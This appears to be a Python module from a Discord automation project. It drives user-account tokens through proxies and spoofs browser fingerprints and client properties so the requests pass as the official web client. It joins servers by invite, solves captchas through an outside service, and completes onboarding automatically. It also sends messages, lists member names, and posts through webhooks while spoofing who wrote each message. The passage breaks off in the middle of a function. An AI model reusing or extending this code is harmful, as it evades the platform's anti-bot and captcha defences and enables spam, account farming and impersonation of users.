import asyncio
import base64
import json
import logging
import random
import re
import secrets
import time
import uuid
from dataclasses import asdict
from datetime import datetime, timezone
from pathlib import Path

import httpx
from browserforge.fingerprints import FingerprintGenerator

from app.core.config import get_settings
from app.models.research import CaptchaChallenge
from app.services.captcha_solver import CaptchaSolverService
from app.services.gateway_session import GatewaySession

logger = logging.getLogger('discord_research.discord_client')
captcha_debug_logger = logging.getLogger('discord_research.captcha_solutions')
join_failures_logger = logging.getLogger('discord_research.join_failures')
RETRY_BASE_DELAY_SECONDS = 0.5
RETRY_MAX_SLEEP_SECONDS = 2.0
RETRY_JITTER_SECONDS = 0.2

# Cached globally — FingerprintGenerator is expensive to initialise.
_FINGERPRINT_GENERATOR = FingerprintGenerator()
_FIREFOX_RE = re.compile(r'Firefox/([\d.]+)')

# Pre-computed base64 X-Context-Properties header for the Discord join endpoint.
# Uses the minimal format expected by the web client.
_CONTEXT_PROPERTIES = base64.b64encode(
    json.dumps({'location': 'Join Guild'}, separators=(',', ':')).encode()
).decode()

# ---------------------------------------------------------------------------
# Per-token fingerprint cache
# ---------------------------------------------------------------------------
# Each token is assigned one stable _TokenFP instance on first use.  All API
# actions (join, send_message, patch nickname, etc.) pull their browser
# identity headers from this cache so every request for the same token looks
# like the same browser/device — matching the Joiner reference implementation.

_TOKEN_FP_MAX_SIZE = 2000  # evict oldest entry when full


class _TokenFP:
    """Stable per-token fingerprint profile used across all API actions."""

    __slots__ = ('user_agent', 'browser_version', 'client_identity', 'locale', 'fingerprint')

    def __init__(
        self,
        user_agent: str,
        browser_version: str,
        client_identity: dict,
        locale: str,
        fingerprint: dict,
    ) -> None:
        self.user_agent = user_agent
        self.browser_version = browser_version
        self.client_identity = client_identity
        self.locale = locale
        self.fingerprint = fingerprint


# Module-level per-token fingerprint cache (keyed by token value string).
_TOKEN_FP_CACHE: dict[str, _TokenFP] = {}


def _make_token_fingerprint(locale: str = 'en-US') -> _TokenFP:
    """Generate a new _TokenFP using the globally cached FingerprintGenerator."""
    fp = asdict(_FINGERPRINT_GENERATOR.generate(browser='firefox', os='macos'))
    navigator = fp.get('navigator') or {}
    user_agent = navigator.get('userAgent') or ''
    browser_version = '0'
    uda = navigator.get('userAgentData')
    if uda and uda.get('brands'):
        browser_version = str(uda['brands'][-1].get('version', '0'))
    else:
        m = _FIREFOX_RE.search(user_agent)
        if m:
            browser_version = m.group(1)
    client_identity = {
        k: str(uuid.uuid4())
        for k in ('client_launch_id', 'launch_signature', 'client_heartbeat_session_id')
    }
    return _TokenFP(
        user_agent=user_agent,
        browser_version=browser_version,
        client_identity=client_identity,
        locale=locale,
        fingerprint=fp,
    )


def _generate_nonce() -> str:
    """Snowflake-based nonce matching the Discord web client (docs/Joiner send.py)."""
    timestamp = int(time.time() * 1000) - 1420070400000
    return str(timestamp << 22)


def _build_user_agent(chrome_version: str) -> str:
    return (
        f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
        f'AppleWebKit/537.36 (KHTML, like Gecko) '
        f'Chrome/{chrome_version} Safari/537.36'
    )


def _build_super_properties(chrome_version: str, build_number: int) -> str:
    """Return base64-encoded X-Super-Properties header value (static Chrome profile)."""
    ua = _build_user_agent(chrome_version)
    return base64.b64encode(
        json.dumps(
            {
                'os': 'Windows',
                'browser': 'Chrome',
                'device': '',
                'system_locale': 'en-US',
                'browser_user_agent': ua,
                'browser_version': chrome_version,
                'os_version': '10',
                'referrer': '',
                'referring_domain': '',
                'referrer_current': '',
                'referring_domain_current': '',
                'release_channel': 'stable',
                'client_build_number': build_number,
                'client_event_source': None,
            },
            separators=(',', ':'),
        ).encode()
    ).decode()


def _build_fingerprint_super_properties(
    fingerprint: dict,
    browser_version: str,
    client_identity: dict,
    locale: str = 'en-US',
) -> str:
    """Return base64-encoded X-Super-Properties built from a browserforge fingerprint.

    Uses the same fields as the Discord web client IDENTIFY payload so that the
    HTTP super-properties header is consistent with the WebSocket gateway session.
    """
    navigator = fingerprint.get('navigator') or {}
    user_agent = navigator.get('userAgent') or ''
    props = {
        'os': 'macos',
        'browser': 'firefox',
        'device': '',
        'system_locale': locale,
        'has_client_mods': True,
        'browser_user_agent': user_agent,
        'browser_version': browser_version,
        'os_version': '10',
        'referrer': '',
        'referring_domain': '',
        'referrer_current': '',
        'referring_domain_current': '',
        'release_channel': 'stable',
        'client_event_source': None,
        **client_identity,
        'client_app_state': 'focused',
    }
    return base64.b64encode(json.dumps(props, separators=(',', ':')).encode()).decode()


class DiscordClient:
    def __init__(self) -> None:
        settings = get_settings()
        self.base_url = settings.discord_api_base_url.rstrip('/')
        self.token = (settings.discord_bot_token or '').strip()
        self.runtype = settings.runtype
        self.captcha_solver = CaptchaSolverService()
        self._chrome_version = settings.discord_chrome_version
        self._build_number = settings.discord_client_build_number
        self._user_agent = _build_user_agent(self._chrome_version)
        self._super_properties = _build_super_properties(self._chrome_version, self._build_number)
        self._join_failure_log_enabled = settings.join_failure_log_enabled
        self._gateway_session_timeout = settings.gateway_session_timeout
        # Resolve the join failures directory relative to the project root so that
        # relative paths in the config work correctly regardless of cwd.
        _project_root = Path(__file__).resolve().parent.parent.parent.parent
        _jf_dir = settings.join_failure_log_dir
        self._join_failure_log_dir = (
            Path(_jf_dir) if Path(_jf_dir).is_absolute() else _project_root / _jf_dir
        )

    async def get_guild(self, guild_id: str) -> dict:
        if not self.token:
            return {'id': guild_id, 'name': 'Unknown (token missing)'}
        headers = {'Authorization': f'Bot {self.token}'}
        async with httpx.AsyncClient(timeout=20) as client:
            try:
                response = await client.get(f'{self.base_url}/guilds/{guild_id}', headers=headers)
                response.raise_for_status()
                return response.json()
            except httpx.HTTPError:
                return {'id': guild_id, 'name': 'Unknown (discord api unavailable)'}

    # ------------------------------------------------------------------
    # Per-token fingerprint helpers
    # ------------------------------------------------------------------

    def _get_token_fingerprint(self, token: str, locale: str = 'en-US') -> _TokenFP:
        """Return the cached fingerprint for *token*, creating it if absent.

        When creating a new fingerprint the supplied *locale* is used.  If the
        fingerprint already exists and a non-default locale is supplied the
        locale is updated in place so all subsequent requests for that token
        use the correct locale after the first ``/users/@me`` fetch.
        """
        cached = _TOKEN_FP_CACHE.get(token)
        if cached is not None:
            if locale and locale != 'en-US' and cached.locale != locale:
                cached.locale = locale
            return cached
        # Evict the oldest entry when the cache is full.
        if len(_TOKEN_FP_CACHE) >= _TOKEN_FP_MAX_SIZE:
            try:
                _TOKEN_FP_CACHE.pop(next(iter(_TOKEN_FP_CACHE)))
            except StopIteration:
                pass
        new_fp = _make_token_fingerprint(locale=locale)
        _TOKEN_FP_CACHE[token] = new_fp
        return new_fp

    def _discord_headers(
        self,
        token: str,
        *,
        content_type: bool = False,
        referer: str | None = None,
        context_properties: str | None = None,
    ) -> dict:
        """Build complete Discord HTTP headers for a user-token request.

        Uses the per-token fingerprint from ``_TOKEN_FP_CACHE`` so that every
        action for the same token (join, send_message, patch nickname, etc.)
        presents a consistent browser identity to Discord — matching the
        Joiner reference implementation's ``tls_client.Session`` approach.
        """
        fp = self._get_token_fingerprint(token)
        accept_lang = (
            f'{fp.locale},en;q=0.9'
            if fp.locale and fp.locale != 'en-US'
            else 'en-US,en;q=0.9'
        )
        headers: dict = {
            'Authorization': token,
            'User-Agent': fp.user_agent,
            'X-Super-Properties': _build_fingerprint_super_properties(
                fp.fingerprint, fp.browser_version, fp.client_identity, locale=fp.locale
            ),
            'X-Discord-Locale': fp.locale,
            'X-Discord-Timezone': 'America/New_York',
            'x-debug-options': 'bugReporterEnabled',
            'Accept': '*/*',
            'Accept-Language': accept_lang,
            'Origin': 'https://discord.com',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
        }
        if content_type:
            headers['Content-Type'] = 'application/json'
        if referer:
            headers['Referer'] = referer
        if context_properties:
            headers['X-Context-Properties'] = context_properties
        return headers

    async def get_guild_onboarding(self, guild_id: str, token: str) -> dict:
        """Return the onboarding config for a guild, using a user token."""
        headers = self._discord_headers(token)
        async with httpx.AsyncClient(timeout=20) as client:
            try:
                response = await client.get(
                    f'{self.base_url}/guilds/{guild_id}/onboarding',
                    headers=headers,
                )
                if response.status_code == 200:
                    return response.json()
            except httpx.HTTPError as exc:
                logger.debug('get_guild_onboarding error guild=%s: %s', guild_id, exc)
        return {'enabled': False, 'prompts': [], 'default_channel_ids': []}

    async def complete_onboarding(
        self,
        guild_id: str,
        token: str,
        proxy_url: str | None = None,
    ) -> bool:
        """Auto-complete server onboarding for a user token.

        Selects the first available option for every prompt so the account is
        no longer gated from sending messages.  Returns True if onboarding was
        completed (or was not required), False on unexpected errors.
        """
        onboarding = await self.get_guild_onboarding(guild_id, token)
        if not onboarding.get('enabled'):
            return True  # nothing to do

        prompts = onboarding.get('prompts', [])
        if not prompts:
            return True

        onboarding_responses: dict[str, list[str]] = {}
        seen_prompts: list[str] = []
        seen_responses: list[str] = []

        for prompt in prompts:
            prompt_id = str(prompt.get('id', ''))
            options = prompt.get('options', [])
            if not prompt_id or not options:
                continue
            # Pick the first available option for each prompt; if multiple
            # selections are allowed we still pick just one to satisfy
            # "required" prompts without overfitting.
            selected_id = str(options[0]['id'])
            onboarding_responses[prompt_id] = [selected_id]
            seen_prompts.append(prompt_id)
            seen_responses.append(selected_id)

        payload = {
            'onboarding_responses': onboarding_responses,
            'onboarding_prompts_seen': seen_prompts,
            'onboarding_responses_seen': seen_responses,
        }
        headers = self._discord_headers(token, content_type=True)

        max_attempts = 3
        async with httpx.AsyncClient(timeout=20, proxy=proxy_url) as client:
            for attempt in range(1, max_attempts + 1):
                try:
                    resp = await client.post(
                        f'{self.base_url}/guilds/{guild_id}/complete-onboarding',
                        headers=headers,
                        json=payload,
                    )
                    if resp.status_code in (200, 201, 204):
                        logger.info('Onboarding completed for guild %s', guild_id)
                        return True
                    if resp.status_code in (429, 500, 502, 503, 504) and attempt < max_attempts:
                        await self._sleep_before_retry(attempt)
                        continue
                    if resp.status_code == 403:
                        error_payload = self._response_error_payload(resp)
                        if error_payload.get('code') == 50001:
                            logger.info('Onboarding not available or no access for guild %s', guild_id)
                            return True
                    logger.warning(
                        'complete_onboarding guild=%s status=%s body=%s',
                        guild_id,
                        resp.status_code,
                        resp.text[:200],
                    )
                    break
                except httpx.HTTPError as exc:
                    if attempt < max_attempts:
                        await self._sleep_before_retry(attempt)
                        continue
                    logger.warning('complete_onboarding HTTP error guild=%s: %s', guild_id, exc)
        return False

    async def join_guild_via_invite(
        self,
        invite_code: str,
        token: str,
        proxy_url: str | None = None,
        token_id: int | None = None,
        guild_id: str | None = None,
        db=None,
    ) -> dict:
        """Join a guild via invite code with a user token.

        Uses advanced browser fingerprinting and a real Discord WebSocket gateway
        session_id for higher authenticity.  Falls back to a random session_id if
        the gateway connection times out.

        After a successful join the method automatically completes server
        onboarding so the account is immediately able to send messages even if
        the server uses Discord's onboarding gate.
        """
        code = self.extract_invite_code(invite_code)
        if not code:
            return {'status': 'failed', 'code': 400, 'detail': 'Invalid invite code format'}

        invite_metadata = await self._fetch_invite_metadata(code=code, token=token, proxy_url=proxy_url)

        # ------------------------------------------------------------------
        # Get or create the stable per-token fingerprint profile.
        # Fetch the account's actual locale and store it in the fingerprint
        # cache so all subsequent actions for this token use consistent
        # browser identity headers.
        # ------------------------------------------------------------------
        locale = await self._fetch_user_locale(token=token, proxy_url=proxy_url)
        fp = self._get_token_fingerprint(token, locale=locale)

        # ------------------------------------------------------------------
        # Obtain a real WebSocket gateway session_id via the Discord gateway,
        # passing the same fingerprint so IDENTIFY matches the HTTP headers.
        # Falls back to a random session_id if the connection times out.
        # ------------------------------------------------------------------
        session_id = await self._acquire_gateway_session_id(
            token=token,
            proxy_url=proxy_url,
            timeout=self._gateway_session_timeout,
            fp=fp,
        )
        if session_id is None:
            session_id = str(invite_metadata.get('captcha_session_id') or secrets.token_hex(16))
            logger.info(
                'Discord join using fallback session_id invite=%s token_id=%s', code, token_id
            )

        headers = {
            **self._discord_headers(
                token,
                content_type=True,
                referer=f'https://discord.com/invite/{code}',
                context_properties=_CONTEXT_PROPERTIES,
            ),
        }
        max_attempts = 5
        captcha_payload: dict = {}
        captcha_payload_variants: list[dict] = []
        captcha_payload_variant_index = 0
        captcha_solve_result: dict = {}
        captcha_attempts = 0
        max_captcha_attempts = 2
        async with httpx.AsyncClient(timeout=25, proxy=proxy_url) as client:
            for attempt in range(1, max_attempts + 1):
                try:
                    # Always include session_id; merge captcha fields on top when present.
                    body: dict = {'session_id': session_id, **captcha_payload}
                    if captcha_payload:
                        logger.info(
                            'Discord join retry with captcha payload invite=%s token_id=%s guild_id=%s payload=%s',
                            code,
                            token_id,
                            guild_id,
                            self._pretty_json(captcha_payload),
                        )
                        captcha_debug_logger.info(
                            'Discord join captcha retry payload invite=%s token_id=%s guild_id=%s payload=%s',
                            code,
                            token_id,
                            guild_id,
                            self._pretty_json(captcha_payload),
                        )
                    request_headers = dict(headers)
                    if captcha_payload.get('captcha_key'):
                        request_headers['X-Captcha-Key'] = str(captcha_payload['captcha_key'])
                    resp = await client.post(
                        f'{self.base_url}/invites/{code}',
                        headers=request_headers,
                        json=body,
                    )
                    if resp.status_code in (200, 201):
                        data = resp.json()
                        guild_info = data.get('guild') or {}
                        joined_guild_id = guild_info.get('id') or data.get('guild_id', '')
                        if not joined_guild_id:
                            return {'status': 'failed', 'code': 502, 'detail': 'Join succeeded but guild_id missing in Discord response'}
                        access_check = await self.validate_guild_access(guild_id=joined_guild_id, token=token, proxy_url=proxy_url)
                        if joined_guild_id:
                            onboarding_ok = await self.complete_onboarding(joined_guild_id, token, proxy_url)
                            logger.info('Joined guild %s (onboarding_ok=%s access=%s)', joined_guild_id, onboarding_ok, access_check.get('status'))
                        if access_check.get('status') == 'denied':
                            return {
                                'status': 'failed',
                                'code': 403,
                                'error_code': 50001,
                                'detail': access_check.get('detail', 'Missing access to server channels'),
                                'guild': guild_info,
                            }
                        return {'status': 'joined', 'guild': guild_info}
                    if resp.status_code == 204:
                        return {'status': 'already_joined'}

                    error_payload = self._response_error_payload(resp)
                    if captcha_payload:
                        logger.warning(
                            'Discord join captcha retry rejected invite=%s token_id=%s guild_id=%s status=%s response=%s',
                            code,
                            token_id,
                            guild_id,
                            resp.status_code,
                            self._pretty_json(error_payload),
                        )
                        captcha_debug_logger.warning(
                            'Discord join captcha retry rejected invite=%s token_id=%s guild_id=%s status=%s payload=%s response=%s',
                            code,
                            token_id,
                            guild_id,
                            resp.status_code,
                            self._pretty_json(captcha_payload),
                            self._pretty_json(error_payload),
                        )
                    challenge_payload = dict(invite_metadata) if self.captcha_solver.is_captcha_challenge(invite_metadata) else {}
                    challenge_payload.update(error_payload)
                    if (
                        self.captcha_solver.is_captcha_challenge(challenge_payload)
                        and self.captcha_solver.is_enabled
                        and captcha_attempts < max_captcha_attempts
                    ):
                        if captcha_payload_variants and (captcha_payload_variant_index + 1) < len(captcha_payload_variants):
                            captcha_payload_variant_index += 1
                            captcha_payload = captcha_payload_variants[captcha_payload_variant_index]
                            logger.info(
                                'Discord join trying alternate captcha payload variant invite=%s token_id=%s guild_id=%s variant=%s/%s',
                                code,
                                token_id,
                                guild_id,
                                captcha_payload_variant_index + 1,
                                len(captcha_payload_variants),
                            )
                            if captcha_solve_result.get('captcha_context_id_empty'):
                                self._mark_empty_context_retry(db, captcha_solve_result.get('task_id'))
                            continue
                        captcha_attempts += 1
                        logger.info(
                            'Discord join captcha challenge detected invite=%s token_id=%s guild_id=%s attempt=%s',
                            code,
                            token_id,
                            guild_id,
                            captcha_attempts,
                        )
                        solve_result = await self.captcha_solver.solve_discord_challenge(
                            challenge_payload,
                            token_id=token_id,
                            guild_id=guild_id,
                            user_agent=fp.user_agent,
                            proxy_url=proxy_url,
                            db=db,
                        )
                        logger.info(
                            'Discord join captcha solve result invite=%s token_id=%s guild_id=%s result=%s',
                            code,
                            token_id,
                            guild_id,
                            self._pretty_json(solve_result),
                        )
                        captcha_debug_logger.info(
                            'Discord join solve_result invite=%s token_id=%s guild_id=%s result=%s',
                            code,
                            token_id,
                            guild_id,
                            self._pretty_json(solve_result),
                        )
                        if solve_result.get('status') == 'ready':
                            captcha_payload_variants = self._build_captcha_payload_variants(solve_result)
                            captcha_payload_variant_index = 0
                            captcha_payload = captcha_payload_variants[captcha_payload_variant_index]
                            captcha_solve_result = solve_result
                            if solve_result.get('captcha_context_id_empty'):
                                logger.warning(
                                    'Discord join solved captcha has empty contextId invite=%s token_id=%s guild_id=%s; retrying anyway',
                                    code,
                                    token_id,
                                    guild_id,
                                )
                                self._mark_empty_context_retry(db, solve_result.get('task_id'))
                            continue
                        logger.warning(
                            'Discord join captcha solve failed invite=%s token_id=%s guild_id=%s detail=%s',
                            code,
                            token_id,
                            guild_id,
                            solve_result.get('detail'),
                        )
                        failed_result = {
                            'status': 'failed',
                            'code': resp.status_code,
                            'detail': f"Captcha solve failed: {solve_result.get('detail', 'unknown error')}",
                        }
                        self._log_join_failure(code, token_id, guild_id, resp, body)
                        return failed_result

                    if resp.status_code in (429, 500, 502, 503, 504) and attempt < max_attempts:
                        retry_after_seconds = self._retry_after_seconds(resp)
                        await self._sleep_before_retry(attempt, retry_after_seconds=retry_after_seconds)
                        continue

                    failed_result = {
                        'status': 'failed',
                        'code': resp.status_code,
                        'detail': json.dumps(error_payload, ensure_ascii=False),
                    }
                    self._log_join_failure(code, token_id, guild_id, resp, body)
                    return failed_result
                except httpx.HTTPError as exc:
                    if attempt < max_attempts:
                        await self._sleep_before_retry(attempt)
                        continue
                    return {'status': 'error', 'detail': str(exc)}

    @staticmethod
    def _build_captcha_payload_variants(solve_result: dict) -> list[dict]:
        payload: dict = {'captcha_key': solve_result.get('captcha_key')}
        if solve_result.get('captcha_rqtoken'):
            payload['captcha_rqtoken'] = solve_result.get('captcha_rqtoken')
        captcha_rqdata = solve_result.get('captcha_rqdata')
        if captcha_rqdata:
            payload['captcha_rqdata'] = captcha_rqdata
        if solve_result.get('captcha_session_id'):
            payload['captcha_session_id'] = solve_result.get('captcha_session_id')
        return [payload]

    async def _fetch_user_locale(self, token: str, proxy_url: str | None = None) -> str:
        """Return the account locale from ``/users/@me``, defaulting to ``en-US``."""
        headers = {'Authorization': token}
        async with httpx.AsyncClient(timeout=10, proxy=proxy_url) as client:
            try:
                resp = await client.get(f'{self.base_url}/users/@me', headers=headers)
                if resp.status_code == 200:
                    return resp.json().get('locale') or 'en-US'
            except httpx.HTTPError as exc:
                logger.debug('_fetch_user_locale HTTP error: %s', exc)
        return 'en-US'

    async def _acquire_gateway_session_id(
        self,
        token: str,
        proxy_url: str | None = None,
        timeout: float = 20.0,
        fp: '_TokenFP | None' = None,
    ) -> str | None:
        try:
            gw_kwargs: dict = {'token': token, 'proxy': proxy_url}
            if fp is not None:
                gw_kwargs['user_agent'] = fp.user_agent
                gw_kwargs['browser_version'] = fp.browser_version
                gw_kwargs['client_identity'] = fp.client_identity
                gw_kwargs['locale'] = fp.locale
            async with GatewaySession(**gw_kwargs) as gw:
                ready = await gw.wait_for_ready(timeout=timeout)
                if ready and gw.session_id:
                    logger.debug('GatewaySession session_id acquired for token_id (gateway)')
                    return gw.session_id
        except Exception as exc:
            logger.warning('GatewaySession connect error: %s', exc)
        return None

    async def _fetch_invite_metadata(self, code: str, token: str, proxy_url: str | None = None) -> dict:
        """Fetch invite metadata similarly to the Discord web-client preflight."""
        headers = self._discord_headers(token, referer=f'https://discord.com/invite/{code}')
        params = {
            'with_counts': 'true',
            'with_expiration': 'true',
            'with_permissions': 'true',
        }
        async with httpx.AsyncClient(timeout=20, proxy=proxy_url) as client:
            try:
                resp = await client.get(f'{self.base_url}/invites/{code}', headers=headers, params=params)
                if resp.status_code == 200:
                    return self._response_error_payload(resp)
                logger.debug(
                    'invite preflight metadata unavailable invite=%s status=%s',
                    code,
                    resp.status_code,
                )
            except httpx.HTTPError as exc:
                logger.debug('invite preflight metadata request failed invite=%s error=%s', code, exc)
        return {}

    @staticmethod
    def _mark_empty_context_retry(db, task_id: str | None) -> None:
        if db is None or not task_id:
            return
        try:
            row = db.query(CaptchaChallenge).filter(CaptchaChallenge.task_id == str(task_id)).first()
            if row is None:
                return
            row.retried_with_empty_context = True
            db.commit()
        except Exception as exc:  # pragma: no cover
            logger.warning('Failed to mark retried_with_empty_context task_id=%s: %s', task_id, exc)

    @staticmethod
    def _pretty_json(payload: object) -> str:
        try:
            return json.dumps(payload, ensure_ascii=False, sort_keys=True, indent=2, default=str)
        except TypeError:
            return str(payload)

    def _log_join_failure(
        self,
        invite_code: str,
        token_id: int | None,
        guild_id: str | None,
        response: httpx.Response,
        request_body: dict,
    ) -> None:
        """Write a full-response JSON file for a failed Discord join attempt.

        The file is only written when join_failure_log_enabled=True.
        Response headers are included as-is; the Authorization header is
        stripped from request metadata to avoid leaking credentials.
        """
        join_failures_logger.warning(
            'Discord join failed invite=%s token_id=%s guild_id=%s status=%s body=%s',
            invite_code,
            token_id,
            guild_id,
            response.status_code,
            response.text[:500],
        )

        if not self._join_failure_log_enabled:
            return

        try:
            self._join_failure_log_dir.mkdir(parents=True, exist_ok=True)
            ts = datetime.now(timezone.utc).strftime('%Y%m%dT%H%M%S%f')
            filename = f'join_failure_{ts}_invite_{invite_code}_token_{token_id}.json'
            # Sanitise: never write the Authorization header to disk.
            safe_req_body = {k: v for k, v in request_body.items() if k.lower() != 'authorization'}
            record = {
                'timestamp': datetime.now(timezone.utc).isoformat(),
                'invite_code': invite_code,
                'token_id': token_id,
                'guild_id': guild_id,
                'http_status': response.status_code,
                'response_headers': dict(response.headers),
                'response_body': response.text,
                'request_body': safe_req_body,
            }
            filepath = self._join_failure_log_dir / filename
            filepath.write_text(json.dumps(record, ensure_ascii=False, indent=2), encoding='utf-8')
            logger.debug('Join failure response written to %s', filepath)
        except Exception as exc:  # pragma: no cover
            logger.warning('Failed to write join failure log file: %s', exc)

    async def send_message(
        self,
        channel_id: str,
        content: str,
        token: str,
        proxy_url: str | None = None,
    ) -> dict:
        """Send a message to a Discord channel using a user token."""
        headers = self._discord_headers(token, content_type=True)
        async with httpx.AsyncClient(timeout=20, proxy=proxy_url) as client:
            max_attempts = 4
            for attempt in range(1, max_attempts + 1):
                try:
                    resp = await client.post(
                        f'{self.base_url}/channels/{channel_id}/messages',
                        headers=headers,
                        json={
                            'content': content,
                            'nonce': _generate_nonce(),
                            'tts': False,
                            'flags': 0,
                            'mobile_network_type': 'unknown',
                        },
                    )
                    if resp.status_code in (200, 201):
                        return {'status': 'sent', 'message': resp.json()}
                    if resp.status_code in (401, 403):
                        payload = self._response_error_payload(resp)
                        return {
                            'status': 'failed',
                            'code': resp.status_code,
                            'error_code': payload.get('code'),
                            'detail': payload.get('message', resp.text[:200]),
                        }
                    if resp.status_code == 429 and attempt < max_attempts:
                        await self._sleep_before_retry(attempt, retry_after_seconds=self._retry_after_seconds(resp))
                        continue
                    if resp.status_code >= 500 and attempt < max_attempts:
                        await self._sleep_before_retry(attempt)
                        continue
                    return {'status': 'failed', 'code': resp.status_code, 'detail': resp.text[:200]}
                except httpx.HTTPError as exc:
                    if attempt < max_attempts:
                        await self._sleep_before_retry(attempt)
                        continue
                    return {'status': 'error', 'detail': str(exc)}

    async def get_or_create_channel_webhook(
        self,
        channel_id: str,
        bot_token: str | None = None,
        webhook_name: str = 'DFA Mirror',
    ) -> dict:
        """Return a reusable webhook for a target channel."""
        raw = (bot_token or self.token or '').strip()
        if not raw:
            return {'status': 'failed', 'detail': 'bot token missing'}
        # Normalize: strip an existing 'Bot ' prefix before re-adding so we never
        # produce a double-prefixed value like 'Bot Bot <token>'.
        bare = raw[4:] if raw.lower().startswith('bot ') else raw
        headers = {'Authorization': f'Bot {bare}', 'Content-Type': 'application/json'}
        async with httpx.AsyncClient(timeout=20) as client:
            try:
                list_resp = await client.get(f'{self.base_url}/channels/{channel_id}/webhooks', headers=headers)
                if list_resp.status_code == 200:
                    hooks = list_resp.json() if isinstance(list_resp.json(), list) else []
                    for hook in hooks:
                        hook_token = hook.get('token')
                        if hook.get('type') == 1 and hook_token and hook.get('name') == webhook_name:
                            return {
                                'status': 'ok',
                                'webhook_id': str(hook.get('id')),
                                'webhook_token': hook_token,
                                'url': f"{self.base_url}/webhooks/{hook.get('id')}/{hook_token}",
                            }
                create_resp = await client.post(
                    f'{self.base_url}/channels/{channel_id}/webhooks',
                    headers=headers,
                    json={'name': webhook_name},
                )
                if create_resp.status_code in (200, 201):
                    hook = create_resp.json()
                    hook_token = hook.get('token')
                    if hook_token:
                        return {
                            'status': 'ok',
                            'webhook_id': str(hook.get('id')),
                            'webhook_token': hook_token,
                            'url': f"{self.base_url}/webhooks/{hook.get('id')}/{hook_token}",
                        }
                return {'status': 'failed', 'code': create_resp.status_code, 'detail': create_resp.text[:200]}
            except httpx.HTTPError as exc:
                return {'status': 'error', 'detail': str(exc)}

    async def send_webhook_message(
        self,
        channel_id: str,
        content: str,
        username: str,
        avatar_url: str | None = None,
        timestamp_iso: str | None = None,
        bot_token: str | None = None,
    ) -> dict:
        """Send a message through a channel webhook while spoofing author identity."""
        webhook = await self.get_or_create_channel_webhook(channel_id=channel_id, bot_token=bot_token)
        if webhook.get('status') != 'ok':
            return webhook
        body_content = content
        if timestamp_iso:
            body_content = f'[{timestamp_iso}] {content}'
        payload = {
            'content': body_content[:2000],
            'username': (username or 'Unknown')[:80],
            'allowed_mentions': {'parse': []},
        }
        if avatar_url:
            payload['avatar_url'] = avatar_url
        async with httpx.AsyncClient(timeout=20) as client:
            try:
                resp = await client.post(f"{webhook['url']}?wait=true", json=payload)
                if resp.status_code in (200, 201, 204):
                    return {'status': 'sent', 'message': resp.json() if resp.content else {}}
                return {'status': 'failed', 'code': resp.status_code, 'detail': resp.text[:200]}
            except httpx.HTTPError as exc:
                return {'status': 'error', 'detail': str(exc)}

    async def get_guild_members(
        self,
        guild_id: str,
        token: str,
        proxy_url: str | None = None,
        limit: int = 100,
    ) -> list[str]:
        """Return a list of member display names (or usernames) for a guild.

        Uses the /guilds/{id}/members endpoint available to user tokens.
        Returns an empty list on any error so callers can degrade gracefully.
        """
        headers = self._discord_headers(token)
        async with httpx.AsyncClient(timeout=20, proxy=proxy_url) as client:
            try:
                resp = await client.get(
                    f'{self.base_url}/guilds/{guild_id}/members',
                    headers=headers,
                    params={'limit': min(limit, 1000)},
                )
                if resp.status_code == 200:
                    members = resp.json()
                    names: list[str] = []
                    for member in members:
                        nick = member.get('nick')
                        user = member.get('user') or {}
                        display = nick or user.get('global_name') or user.get('username') or ''
                        if display:
                            names.append(display)
                    return names
            except httpx.HTTPError as exc:
                logger.debug('get_guild_members error guild=%s: %s', guild_id, exc)
        return []

    async def get_channel_messages(
        self,
        channel_id: str,
        token: str | None = None,
        after: str | None = None,
        limit: int = 50,
        proxy_url: str | None = None,
    ) -> list[dict]:
        """Fetch recent messages from a Discord channel using a user token.

        Returns messages in ascending order (oldest first).  Returns an empty
        list on any error so callers can degrade gracefully.
        """
        auth_token = (token or '').strip()
        if auth_token:
            if self.runtype == 'BOTT' and not auth_token.lower().startswith('bot '):
                headers = {'Authorization': f'Bot {auth_token}'}
            else:
                headers = self._discord_headers(auth_token)
        elif self.token:
            headers = {'Authorization': f'Bot {self.token}'}
        else:
            return []
        params: dict = {'limit': min(limit, 100)}
        if after:
            params['after'] = after
        async with httpx.AsyncClient(timeout=20, proxy=proxy_url) as client:
            try:
                resp = await client.get(
                    f'{self.base_url}/channels/{channel_id}/messages',
                    headers=headers,
                    params=params,
                )
                if resp.status_code == 200:
                    messages = resp.json()
                    # Discord returns newest first; sort to oldest first for sequential processing.
                    messages.sort(key=lambda m: m.get('id', '0'))
                    return messages
                logger.debug(
                    'get_channel_messages channel=%s status=%s',
                    channel_id,
                    resp.status_code,
                )
            except httpx.HTTPError as exc:
                logger.debug('get_channel_messages error channel=%s: %s', channel_id, exc)
        return []

    async def validate_guild_access(self, guild_id: str, token: str, proxy_url: str | None = None) -> dict:
        """Validate that a token can access guild channels after joining."""
        headers = self._discord_headers(token)
        async with httpx.AsyncClient(timeout=20, proxy=proxy_url) as client:
            try:
                resp = await client.get(f'{self.base_url}/guilds/{guild_id}/channels', headers=headers)
                if resp.status_code == 200:
                    return {'status': 'ok'}
                if resp.status_code in (401, 403):
                    payload = self._response_error_payload(resp)
                    return {
                        'status': 'denied',
                        'code': resp.status_code,
                        'error_code': payload.get('code'),
                        'detail': payload.get('message', 'Access denied'),
                    }
                return {'status': 'unknown', 'code': resp.status_code}
            except httpx.HTTPError as exc:
                return {'status': 'error', 'detail': str(exc)}

    async def patch_user_clan_tag(self, token: str, clan_tag: str | None, proxy_url: str | None = None) -> dict:
        headers = self._discord_headers(token, content_type=True)
        payload = {'clan': clan_tag}
        async with httpx.AsyncClient(timeout=20, proxy=proxy_url) as client:
            try:
                resp = await client.patch(f'{self.base_url}/users/@me', headers=headers, json=payload)
                if resp.status_code in (200, 201):
                    return {'status': 'updated', 'user': resp.json()}
                return {'status': 'failed', 'code': resp.status_code, 'detail': resp.text[:200]}
            except httpx.HTTPError as exc:
                return {'status': 'error', 'detail': str(exc)}

    async def patch_member_nickname(
        self,
        guild_id: str,
        user_id: str,
        nickname: str | None,
        token: str,
        proxy_url: str | None = None,
    ) -> dict:
        headers = self._discord_headers(token, content_type=True)
        async with httpx.AsyncClient(timeout=20, proxy=proxy_url) as client:
            try:
                resp = await client.patch(
                    f'{self.base_url}/guilds/{guild_id}/members/@me',
                    headers=headers,
                    json={'nick': nickname},
                )
                if resp.status_code in (200, 204):
                    return {'status': 'updated'}
                return {'status': 'failed', 'code': resp.status_code, 'detail': resp.text[:200]}
            except httpx.HTTPError as exc:
